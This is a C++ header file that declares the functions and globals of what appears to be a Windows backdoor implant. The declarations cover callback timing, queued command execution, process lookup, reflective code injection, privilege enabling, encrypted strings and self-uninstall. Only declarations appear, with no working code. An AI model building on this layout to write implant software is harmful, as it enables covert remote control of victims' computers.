#ifndef TBDEV

#define TBDEV

#include <Windows.h>
#include <string>


//DEFAULT SLEEP TIME BETWEEN CALLBACKS
extern "C" int DEFAULTTIMEOUT;

//TIME TO SLEEP WHEN MULTIPLE COMMANDS ARE QUEUED
extern "C" int SHORTTIMEOUT;

//0=no admin, 1=admin
extern "C" int adminPrivs;

//OS TYPE
extern "C" bool osType; // 0=2K, XP, 2K3 and 1=Vista, 7, 2K8
extern "C" bool osArch; // 0=x86, 1=x64

std::wstring runCommand(std::wstring, std::wstring, int);
DWORD findPid(wchar_t *);
DWORD runReflector(BYTE *, DWORD, DWORD);
void sleepDelay(int);
void runLoop();
bool checkOS();
bool checkArch();
int enableSEPrivilege(LPCTSTR);
int initializeVars();
std::wstring decryptString(int [], int);
int UninstallTB();
HKEY regOpenKey(HKEY, LPCTSTR, REGSAM);
std::wstring regQueryValue(HKEY, LPCTSTR);

#endif